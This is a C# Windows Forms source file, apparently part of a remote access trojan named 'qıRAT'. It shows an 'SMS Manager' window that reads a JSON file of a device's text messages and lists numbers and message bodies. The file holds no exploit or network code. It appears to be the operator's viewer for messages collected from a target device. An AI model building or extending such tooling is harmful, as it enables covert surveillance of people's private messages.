using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace qıRAT
{
    public partial class smsform : Form
    {
        private string deviceName;
        private string jsonFilePath;

        // Constructor for passing data
        public smsform(string devName, string jsonPath)
        {
            InitializeComponent();
            InitializeContextMenu();
            this.deviceName = devName;
            this.jsonFilePath = jsonPath;
            
            // Eventi manuel bagla (Designer baglamamissa diye)
            this.Load += smsform_Load;
        }

        public smsform()
        {
            InitializeComponent();
            InitializeContextMenu();
            this.Load += smsform_Load;
        }

        private void listViewsms_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void smsform_Load(object sender, EventArgs e)
        {
            // Debug mesaji
            // MessageBox.Show($"Loading SMS Code...\nDevice: {deviceName}\nPath: {jsonFilePath}", "Debug Info");

            if (!string.IsNullOrEmpty(deviceName))
            {
                this.Text = "SMS Manager - " + deviceName;
            }
            else
            {
                this.Text = "SMS Manager";
            }

            listViewsms.View = View.Details;
            listViewsms.GridLines = true;
            listViewsms.FullRowSelect = true;
            
            // Kolonlari temizle ve SMS formati kur
            listViewsms.Columns.Clear();
            listViewsms.Columns.Add("Number", 100);
            listViewsms.Columns.Add("Date", 150);
            listViewsms.Columns.Add("Message Body", 850);
            listViewsms.Columns.Add("Type", 80);

            // Verileri yukle
            if (!string.IsNullOrEmpty(jsonFilePath))
            {
                LoadSMSData();
            }
        }

        private void InitializeContextMenu()
        {
            ContextMenuStrip menu = new ContextMenuStrip();
            ToolStripMenuItem copyNumberItem = new ToolStripMenuItem("Copy Number");
            copyNumberItem.Click += (s, e) =>
            {
                if (listViewsms.SelectedItems.Count > 0)
                {
                    string number = listViewsms.SelectedItems[0].Text;
                    if (!string.IsNullOrEmpty(number))
                    {
                        Clipboard.SetText(number);
                    }
                }
            };
            menu.Items.Add(copyNumberItem);

            ToolStripMenuItem copySmsItem = new ToolStripMenuItem("Copy SMS");
            copySmsItem.Click += (s, e) =>
            {
                if (listViewsms.SelectedItems.Count > 0)
                {
                    // Mesaj govdesi 3. kolonda (index 2)
                    var item = listViewsms.SelectedItems[0];
                    if (item.SubItems.Count > 2)
                    {
                        string body = item.SubItems[2].Text;
                        if (!string.IsNullOrEmpty(body))
                        {
                            Clipboard.SetText(body);
                        }
                    }
                }
            };
            menu.Items.Add(copySmsItem);
            listViewsms.ContextMenuStrip = menu;
        }

        private void LoadSMSData()
        {
            try
            {
                if (!System.IO.File.Exists(jsonFilePath)) return;

                string json = System.IO.File.ReadAllText(jsonFilePath);
                
                // Format: {"smsList":[{"phoneNo":"...","msg":"..."}, ...]}
                // Once smsList array icerigini bulalim veya direkt icindeki objeleri.
                // Regex ile direkt "phoneNo":"..." ve "msg":"..." olan bloklari arayalim.
                
                // Bu regex pattern tum objeleri yakalar: {"phoneNo":"...","msg":"..."}
                // Ancak json minified oldugu icin regex biraz hassas olmali.
                
                listViewsms.BeginUpdate();
                listViewsms.Items.Clear();

                // Regex ile phoneNo ve msg keylerini iceren objeleri bulalim
                // Non-greedy match for content inside braces
                var matches = System.Text.RegularExpressions.Regex.Matches(json, "\\{(.*?)\\}");

                foreach (System.Text.RegularExpressions.Match match in matches)
                {
                    string content = match.Groups[1].Value;
                    
                    // Eger icinde smsList array tanimi varsa bu header'dir, gecelim
                    if (content.Contains("\"smsList\":[")) continue;

                    string address = ExtractJsonValue(content, "phoneNo");
                    string body = ExtractJsonValue(content, "msg");
                    
                    // Eger ikisi de bossa ise yaramaz veridir
                    if (string.IsNullOrEmpty(address) && string.IsNullOrEmpty(body)) continue;
                    
                    // Tarih ve Type bilgisi bu JSON yapisinda gorunmuyor, simdilik bos gecelim veya varsayalim
                    string dateStr = "-";
                    string typeStr = "Inbox"; // Varsayilan

                    ListViewItem item = new ListViewItem(address);
                    item.SubItems.Add(dateStr);
                    item.SubItems.Add(unescape(body));
                    item.SubItems.Add(typeStr);
                    listViewsms.Items.Add(item);
                }
                
                listViewsms.EndUpdate();
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error reading SMS data: " + ex.Message);
            }
        }
        
        private string ExtractJsonValue(string content, string key)
        {
             // Key:"Value" formatini ara
            var match = System.Text.RegularExpressions.Regex.Match(content, "\"" + key + "\":\"(.*?)\"");
            if (match.Success) return match.Groups[1].Value;
            
            // Key:Value (integer vb) formatini ara
             match = System.Text.RegularExpressions.Regex.Match(content, "\"" + key + "\":([^,}\"]+)");
             return match.Success ? match.Groups[1].Value : "";
        }

        private string unescape(string str)
        {
             if (str == null) return "";
             // Unicode (\uXXXX) ve ozel karakterleri temizle
             string clean = str.Replace("\\n", "\n").Replace("\\r", "\r").Replace("\\t", "\t").Replace("\\\"", "\"").Replace("\\/", "/");
             
             // Regex ile unicode decode denemesi yapilabilir ama basitce birakalim
             return clean;
        }



      
    }
}
